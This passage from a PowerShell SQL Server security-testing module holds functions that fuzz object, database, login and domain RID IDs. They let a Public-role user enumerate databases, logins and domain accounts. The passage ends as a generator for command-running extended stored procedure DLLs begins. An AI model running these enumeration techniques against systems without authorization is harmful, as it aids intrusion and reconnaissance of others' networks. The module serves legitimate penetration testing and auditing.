            $Instance = ".\"
        }
            
        # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults
        }else{            
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess            
        } 

        # Get role for each database
        $TblDatabases |
        ForEach-Object{

            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  use [$DbName]; 
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                ROUTINE_CATALOG AS [DatabaseName],
	                            ROUTINE_SCHEMA AS [SchemaName],
	                            ROUTINE_NAME as [ProcedureName],
	                            ROUTINE_TYPE as [ProcedureType],
	                            ROUTINE_DEFINITION as [ProcedureDefinition],
	                            SQL_DATA_ACCESS,
	                            ROUTINE_BODY,
	                            CREATED,
	                            LAST_ALTERED
                        FROM [INFORMATION_SCHEMA].[ROUTINES] WHERE 1=1
                        $ProcedureNameFilter" 

            # Execute Query
            $TblProcsTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }                                
    }

    End
    {  
        # Return data
        $TblProcs       
    }
}



#endregion

#########################################################################
#
#region          UTILITY FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLFuzzObjectName
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://raresql.com/2013/01/29/sql-server-all-about-object_id/
# Reference: https://social.technet.microsoft.com/Forums/forefront/en-US/f73c2115-57f7-4cec-a95b-00c2d8252ace/objectid-recycled-?forum=transactsql
Function  Get-SQLFuzzObjectName{
<#
    .SYNOPSIS
        Enumerates objects based on object id using OBJECT_NAME() and only the Public role.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER StartId
        Principal ID to start fuzzing with.
    .PARAMETER EndId
        Principal ID to stop fuzzing with.
    .EXAMPLE
        PS C:\> Get-SQLFuzzObjectName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5

        ComputerName   Instance                       ObjectId ObjectName   
        ------------   --------                       -------- ----------   
        SQLServer1     SQLServer1\STANDARDDEV2014     3        sysrscols    
        SQLServer1     SQLServer1\STANDARDDEV2014     5        sysrowsets   
        SQLServer1     SQLServer1\STANDARDDEV2014     6        sysclones    
        SQLServer1     SQLServer1\STANDARDDEV2014     7        sysallocunits
        SQLServer1     SQLServer1\STANDARDDEV2014     8        sysfiles1
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to start fuzzing with.")]
        [string]$StartId = 1,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to stop fuzzing on.")]
        [string]$EndId = 300,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedObjects = New-Object System.Data.DataTable
    }

    Process
    {
        # All user defined objects are assigned a positive object ID plus system tables. 
        # Apart from these objects, the rest of the system objects are assigned negative object IDs.
        # This object_id comes from the primary key of system table sys.sysschobjs.The column name is id, int  data type and it is not an identity column
        # If you create a new object in the database, the first ID will always be 2073058421 in SQL SERVER 2005 and 245575913 in SQL SERVER 2012.
        # The object_ID increment counter for user defined objects will add 16000057 + Last user defined object_ID and will give you a new ID.    
        <# IThis object_id comes from the primary key of system table sys.sysschobjs. The new object_id will increase 16000057 (a prime number) from 
        last object_id. When the last object_id +16000057 is over the int maximum ( 2147483647), it will start with a new number before the difference
         between the new bigint number and the maximum int. This cycle will generate 134 or 135 new object_id for each cycle. The system has a maximum
          number of objects,  which is 2147483647.
          The object ID is only unique within each database.
        #>          

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
                Write-Verbose "$Instance : Enumerating objects from object IDs..."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId | 
        ForEach-Object {

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$_' as [ObjectId], 
                                OBJECT_NAME($_) as [ObjectName]"
                                        
            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $ObjectName = $TblResults.ObjectName
            if( -not $SuppressVerbose){
                if($ObjectName.length -ge 2){
                     Write-Verbose "$Instance : - Object ID $_ resolved to: $ObjectName"
                }else{
                     Write-Verbose "$Instance : - Object ID $_ resolved to: "
                }
            }
        
            # Append results
            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults   
        }  
    }

    End
    {  
        # Return data
        $TblFuzzedObjects | Where-Object {$_.ObjectName.length -ge 2}
    }
}


# ----------------------------------
#  Get-SQLFuzzDatabaseName
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzDatabaseName{
<#
    .SYNOPSIS
        Enumerates databases based on database id using DB_NAME() and only the Public role.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER StartId
        Principal ID to start fuzzing with.
    .PARAMETER EndId
        Principal ID to stop fuzzing with.
    .EXAMPLE
        PS C:\> Get-SQLFuzzDatabaseName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5

        ComputerName   Instance                       DatabaseId DatabaseName                
        ------------   --------                       ---------- ------------                
        SQLServer1     SQLServer1\STANDARDDEV2014     1          master                      
        SQLServer1     SQLServer1\STANDARDDEV2014     2          tempdb                      
        SQLServer1     SQLServer1\STANDARDDEV2014     3          model                       
        SQLServer1     SQLServer1\STANDARDDEV2014     4          msdb                        
        SQLServer1     SQLServer1\STANDARDDEV2014     5          ReportServer$STANDARDDEV2014
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to start fuzzing with.")]
        [string]$StartId = 1,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to stop fuzzing on.")]
        [string]$EndId = 300,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedDbs = New-Object System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
                Write-Verbose "$Instance : Enumerating database names from database IDs..."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId | 
        ForEach-Object {

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$_' as [DatabaseId], 
                                DB_NAME($_) as [DatabaseName]"
                                        
            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            
            $DatabaseName = $TblResults.DatabaseName
            if($DatabaseName.length -ge 2){
                if( -not $SuppressVerbose){
                    Write-Verbose "$Instance : - ID $_ - Resolved to: $DatabaseName"
                }
            }else{
                if( -not $SuppressVerbose){
                    Write-Verbose "$Instance : - ID $_ - Resolved to:"
                }
            } 
        
            # Append results
            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults   
        }  
    }

    End
    {  
        # Return data
        $TblFuzzedDbs | Where-Object {$_.DatabaseName.length -ge 2}
    }
}


# ----------------------------------
#  Get-SQLFuzzServerLogin
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzServerLogin{
<#
    .SYNOPSIS
        Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER StartId
        Principal ID to start fuzzing with.
    .PARAMETER EndId
        Principal ID to stop fuzzing with.
    .EXAMPLE
        PS C:\> Get-SQLFuzzServerLogin -Instance SQLServer1\STANDARDDEV2014 -StartId 1 -EndId 500 | Select-Object -First 40

        ComputerName   Instance                       PrincipalId PrincipleName                
        ------------   --------                       ----------  -------------                                                        
        SQLServer1     SQLServer1\STANDARDDEV2014     1           sa                                     
        SQLServer1     SQLServer1\STANDARDDEV2014     2           public                                 
        SQLServer1     SQLServer1\STANDARDDEV2014     3           sysadmin                               
        SQLServer1     SQLServer1\STANDARDDEV2014     4           securityadmin                          
        SQLServer1     SQLServer1\STANDARDDEV2014     5           serveradmin                            
        SQLServer1     SQLServer1\STANDARDDEV2014     6           setupadmin                             
        SQLServer1     SQLServer1\STANDARDDEV2014     7           processadmin                           
        SQLServer1     SQLServer1\STANDARDDEV2014     8           diskadmin                              
        SQLServer1     SQLServer1\STANDARDDEV2014     9           dbcreator                              
        SQLServer1     SQLServer1\STANDARDDEV2014     10          bulkadmin                              
        SQLServer1     SQLServer1\STANDARDDEV2014     101         ##MS_SQLResourceSigningCertificate##   
        SQLServer1     SQLServer1\STANDARDDEV2014     102         ##MS_SQLReplicationSigningCertificate##
        SQLServer1     SQLServer1\STANDARDDEV2014     103         ##MS_SQLAuthenticatorCertificate##     
        SQLServer1     SQLServer1\STANDARDDEV2014     105         ##MS_PolicySigningCertificate##        
        SQLServer1     SQLServer1\STANDARDDEV2014     106         ##MS_SmoExtendedSigningCertificate##   
        SQLServer1     SQLServer1\STANDARDDEV2014     121         ##Agent XPs##                          
        SQLServer1     SQLServer1\STANDARDDEV2014     122         ##SQL Mail XPs##                       
        SQLServer1     SQLServer1\STANDARDDEV2014     123         ##Database Mail XPs##                  
        SQLServer1     SQLServer1\STANDARDDEV2014     124         ##SMO and DMO XPs##                    
        SQLServer1     SQLServer1\STANDARDDEV2014     125         ##Ole Automation Procedures##          
        SQLServer1     SQLServer1\STANDARDDEV2014     126         ##Web Assistant Procedures##           
        SQLServer1     SQLServer1\STANDARDDEV2014     127         ##xp_cmdshell##                        
        SQLServer1     SQLServer1\STANDARDDEV2014     128         ##Ad Hoc Distributed Queries##         
        SQLServer1     SQLServer1\STANDARDDEV2014     129         ##Replication XPs##                    
        SQLServer1     SQLServer1\STANDARDDEV2014     257         ##MS_PolicyTsqlExecutionLogin##        
        SQLServer1     SQLServer1\STANDARDDEV2014     259         Domain\User                     
        SQLServer1     SQLServer1\STANDARDDEV2014     260         NT SERVICE\SQLWriter                   
        SQLServer1     SQLServer1\STANDARDDEV2014     261         NT SERVICE\Winmgmt                     
        SQLServer1     SQLServer1\STANDARDDEV2014     262         NT Service\MSSQL$STANDARDDEV2014       
        SQLServer1     SQLServer1\STANDARDDEV2014     263         NT AUTHORITY\SYSTEM                    
        SQLServer1     SQLServer1\STANDARDDEV2014     264         NT SERVICE\SQLAgent$STANDARDDEV2014    
        SQLServer1     SQLServer1\STANDARDDEV2014     265         NT SERVICE\ReportServer$STANDARDDEV2014
        SQLServer1     SQLServer1\STANDARDDEV2014     266         ##MS_PolicyEventProcessingLogin##      
        SQLServer1     SQLServer1\STANDARDDEV2014     267         ##MS_AgentSigningCertificate##         
        SQLServer1     SQLServer1\STANDARDDEV2014     268         MySQLUser1                               
        SQLServer1     SQLServer1\STANDARDDEV2014     270         MySQLUser2                              
        SQLServer1     SQLServer1\STANDARDDEV2014     271         MySQLUser3                             
        SQLServer1     SQLServer1\STANDARDDEV2014     272         MySysadmin1                                   
        SQLServer1     SQLServer1\STANDARDDEV2014     273         Domain\User2                          
        SQLServer1     SQLServer1\STANDARDDEV2014     274         MySysadmin2                                  
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to start fuzzing with.")]
        [string]$StartId = 1,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to stop fuzzing on.")]
        [string]$EndId = 300,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedLogins = New-Object System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
                Write-Verbose "$Instance : Enumerating principal names from principal IDs.."                
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId | 
        ForEach-Object {            

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$_' as [PrincipalId], 
                                SUSER_NAME($_) as [PrincipleName]"
                                        
            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $ServerLogin = $TblResults.PrincipleName
            if(-not $SuppressVerbose){
                if($ServerLogin.length -ge 2){
                    Write-Verbose "$Instance : - Principal ID $_ resolved to: $ServerLogin"
                }else{
                    Write-Verbose "$Instance : - Principal ID $_ resolved to: "
                }
            }
        
            # Append results
            $TblFuzzedLogins = $TblFuzzedLogins + $TblResults   
        }  
    }

    End
    {  
        # Return data
        $TblFuzzedLogins | Where-Object {$_.PrincipleName.length -ge 2}
    }
}


# ----------------------------------
#  Get-SQLFuzzDomainAccount
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzDomainAccount{
<#
    .SYNOPSIS
        Enumerates domain groups, computer accounts, and user accounts based on domain RID using SUSER_SNAME() and only the Public role.
        Note: In a typical domain 10000 or more is recommended for the EndId.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER StartId
        RID to start fuzzing with.
    .PARAMETER EndId
        RID to stop fuzzing with.
    .EXAMPLE
        PS C:\> Get-SQLFuzzDomainAccount -Instance SQLServer1\STANDARDDEV2014 -Verbose -StartId 500 -EndId 1500

        VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
        VERBOSE: SQLServer1\STANDARDDEV2014 : Enumerating Domain accounts from the SQL Server's default domain...
        VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f4010000 (500) Resolved to: Domain\Administrator        
        VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f5010000 (501) Resolved to: Domain\Guest        
        VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f6010000 (502) Resolved to: Domain\krbtgt                
        [TRUNCATED]

        ComputerName   Instance                       DomainAccount                                 
        ------------   --------                       -------------                                 
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Administrator                          
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Guest                                  
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\krbtgt                                 
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Guests                          
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Computers                       
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Controllers                     
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cert Publishers                        
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Schema Admins                          
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Enterprise Admins                      
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Group Policy Creator Owners            
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Read-only Domain Controllers           
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cloneable Domain Controllers           
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Protected Users                        
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\RAS and IAS Servers                    
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Allowed RODC Password Replication Group
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Denied RODC Password Replication Group 
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\HelpServicesGroup  
        
        [TRUNCATED]

        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyUser                 
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyDAUser
        SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyEAUser
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to start fuzzing with.")]
        [string]$StartId = 500,

        [Parameter(Mandatory=$false,
        HelpMessage="Principal ID to stop fuzzing on.")]
        [string]$EndId = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedAccounts = New-Object System.Data.DataTable
    }

    Process
    {        
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
                Write-Verbose "$Instance : Enumerating Domain accounts from the SQL Server's default domain..."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Grab server information
        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                  
        $ComputerName = $ServerInfo.ComputerName
        $Instance = $ServerInfo.InstanceName
        $Domain = $ServerInfo.DomainName
        $DomainGroup = "$Domain\Domain Admins"
        $DomainGroupSid =  Get-SQLQuery -Instance $Instance -Query "select SUSER_SID('$DomainGroup') as DomainGroupSid" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $DomainGroupSidBytes = $DomainGroupSid | Select-Object domaingroupsid -ExpandProperty domaingroupsid
        $DomainGroupSidString = [System.BitConverter]::ToString($DomainGroupSidBytes).Replace("-","").Substring(0,48)
        
        # Fuzz from StartId to EndId
        $StartId..$EndId | 
        ForEach-Object {

            # Convert to Principal ID to hex
            $PrincipalIDHex = '{0:x}' -f $_

            # Get number of characters
            $PrincipalIDHexPad1 = $PrincipalIDHex | Measure-Object -Character         
            $PrincipalIDHexPad2 = $PrincipalIDHexPad1.Characters

            # Check if number is even and fix leading 0 if needed
            If([bool]($PrincipalIDHexPad2%2)){
                 $PrincipalIDHexFix = "0$PrincipalIDHex"
            }

            # Reverse the order of the hex   
            $GroupsOfTwo = $PrincipalIDHexFix -split '(..)' | ? { $_ }
            $GroupsOfTwoR = $GroupsOfTwo | Sort-Object -Descending
            $PrincipalIDHexFix2 = $GroupsOfTwoR -join ''

            # Pad to 8 bytes
            $PrincipalIDPad = $PrincipalIDHexFix2.PadRight(8,'0')

            # Create users rid  
            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"  

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$Rid' as [RID], 
                                SUSER_SNAME($Rid) as [DomainAccount]"
                                        
            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
            
            $DomainAccount = $TblResults.DomainAccount
            if($DomainAccount.length -ge 2){
                if( -not $SuppressVerbose){
                    Write-Verbose "$Instance : - RID $Rid ($_) resolved to: $DomainAccount"
                }
            }else{
                if( -not $SuppressVerbose){
                    Write-Verbose "$Instance : - RID $Rid ($_) resolved to: "
                }
            }
        
            # Append results
            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults              
        }          
    }

    End
    {  
        # Return data
        $TblFuzzedAccounts | Select-Object ComputerName,Instance,DomainAccount -Unique | Where-Object {$_.DomainAccount -notlike ''}
    }
}


# -------------------------------------------
# Function: Get-ComputerNameFromInstance
# ------------------------------------------
# Author: Scott Sutherland
Function Get-ComputerNameFromInstance{
<#
    .SYNOPSIS
        Parses computer name from a provided instance. 
    .PARAMETER Instance
        SQL Server instance to parse. 
    .EXAMPLE
        PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
        SQLServer1
#>
    [CmdletBinding()]
    Param(          
        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance.")]
        [string]$Instance
    )
        
    # Parse ComputerName from provided instance
    If ($Instance){
        $ComputerName = $Instance.split("\")[0].split(",")[0]
    }else{
        $ComputerName = $env:COMPUTERNAME
    }            
    
    Return $ComputerName
}


# -------------------------------------------
# Function:  Get-SQLServiceLocal
# -------------------------------------------
# Author: Scott Sutherland
Function  Get-SQLServiceLocal {
<#
    .SYNOPSIS
        Returns local SQL Server services using Get-WmiObject -Class win32_service. This can only be run against the local server. 
    .EXAMPLE
        PS C:\> Get-SQLServiceLocal | Format-Table -AutoSize

        ComputerName   ServiceDisplayName                                     ServiceName                              ServicePath                                                
        ------------   ------------------                                     -----------                              -----------                                                
        SQLServer1     SQL Server Integration Services 12.0                   MsDtsServer120                           "C:\Program Files\Microsoft SQL Server\120\DTS\Binn\MsDt...
        SQLServer1     SQL Server Analysis Services (STANDARDDEV2014)         MSOLAP$STANDARDDEV2014                   "C:\Program Files\Microsoft SQL Server\MSAS12.STANDARDDE...
        SQLServer1     SQL Server (SQLEXPRESS)                                MSSQL$SQLEXPRESS                         "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
        SQLServer1     SQL Server (STANDARDDEV2014)                           MSSQL$STANDARDDEV2014                    "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
        SQLServer1     SQL Full-text Filter Daemon Launcher (MSSQLSERVER)     MSSQLFDLauncher                          "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
        SQLServer1     SQL Full-text Filter Daemon Launcher (SQLEXPRESS)      MSSQLFDLauncher$SQLEXPRESS               "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
        SQLServer1     SQL Full-text Filter Daemon Launcher (STANDARDDEV2014) MSSQLFDLauncher$STANDARDDEV2014          "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
        SQLServer1     SQL Server (MSSQLSERVER)                               MSSQLSERVER                              "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
        SQLServer1     SQL Server Analysis Services (MSSQLSERVER)             MSSQLServerOLAPService                   "C:\Program Files\Microsoft SQL Server\MSAS12.MSSQLSERVE...
        SQLServer1     SQL Server Reporting Services (MSSQLSERVER)            ReportServer                             "C:\Program Files\Microsoft SQL Server\MSRS12.MSSQLSERVE...
        SQLServer1     SQL Server Reporting Services (SQLEXPRESS)             ReportServer$SQLEXPRESS                  "C:\Program Files\Microsoft SQL Server\MSRS12.SQLEXPRESS...
        SQLServer1     SQL Server Reporting Services (STANDARDDEV2014)        ReportServer$STANDARDDEV2014             "C:\Program Files\Microsoft SQL Server\MSRS12.STANDARDDE...
        SQLServer1     SQL Server Distributed Replay Client                   SQL Server Distributed Replay Client     "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
        SQLServer1     SQL Server Distributed Replay Controller               SQL Server Distributed Replay Controller "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
        SQLServer1     SQL Server Agent (SQLEXPRESS)                          SQLAgent$SQLEXPRESS                      "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
        SQLServer1     SQL Server Agent (STANDARDDEV2014)                     SQLAgent$STANDARDDEV2014                 "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
        SQLServer1     SQL Server Browser                                     SQLBrowser                               "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\s...
        SQLServer1     SQL Server Agent (MSSQLSERVER)                         SQLSERVERAGENT                           "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
        SQLServer1     SQL Server VSS Writer                                  SQLWriter                                "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwrit...
#>
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object System.Data.DataTable
        $TblLocalInstances.Columns.Add("ComputerName") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceDisplayName") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceName") | Out-Null
        $TblLocalInstances.Columns.Add("ServicePath") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceAccount") | Out-Null
        $TblLocalInstances.Columns.Add("ServiceState") | Out-Null
    }

    Process
    {       
       # Grab SQL Server services based on file path
       $SqlServices = Get-WmiObject -Class win32_service | Where-Object {$_.pathname -like "*Microsoft SQL Server*"} | Select-Object DisplayName,PathName,Name,StartName,State,SystemName
       
       # Add recrds to SQL Server instance table        
       $SqlServices |
       ForEach-Object{
                $TblLocalInstances.Rows.Add(
                [string]$_.SystemName,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State) | Out-Null                  
       }
    }

    End
    {  
        
        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count

        # Return data
        $TblLocalInstances         
    }
}


# -------------------------------------------
# Function:  Create-SQLFile-XPDLL
# -------------------------------------------
function Create-SQLFile-XPDLL
{
<#
    .SYNOPSIS
        This script can be used to generate a DLL file with an exported function that can be registered as an 
	    extended stored procedure in SQL Server.  The exported function can be configured to run any 
